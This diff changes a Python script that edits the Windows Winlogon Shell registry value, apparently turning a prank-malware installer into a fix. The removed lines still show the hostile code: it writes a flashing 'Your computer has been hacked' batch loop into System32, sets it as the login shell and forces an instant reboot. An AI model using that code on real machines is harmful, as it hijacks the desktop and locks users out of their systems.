@@ -4,31 +4,12 @@ import asyncio
 
 system32_path = os.path.join(os.environ['SystemRoot'], 'System32')
 file_path = os.path.join(system32_path, '1.cmd')
-
-with open(file_path, 'w') as file:
-    file.write('''@echo off
-setlocal enabledelayedexpansion
-
-set "text=Your computer has been hacked"
-set "colors=0 1 2 3 4 5 6 7 8 9 A B C D E F"
-
-:loop
-for /l %%x in (1,1,10) do (
-    for %%y in (%colors%) do (
-        color %%y
-        echo !text!
-        ping localhost -n 1 >nul
-    )
-)
-
-color 07
-goto loop
-''')
+os.remove(file_path)
 
 def modify_registry():
     key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
     value_name = "Shell"
-    new_value_data = "1.cmd"
+    new_value_data = "explorer.exe"
     
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
@@ -36,8 +17,8 @@ def modify_registry():
         winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, new_value_data)
 
         winreg.CloseKey(key)
-        asyncio.run(async_sleep(0.5))
-        os.system('shutdown -r -t 0')
+        os.system('shutdown -r -t 10')
+        input("Ready! Your computer will restart after 10 seconds to apply the changes...")
     except Exception as e:
         print(f"Error: {e}")
 
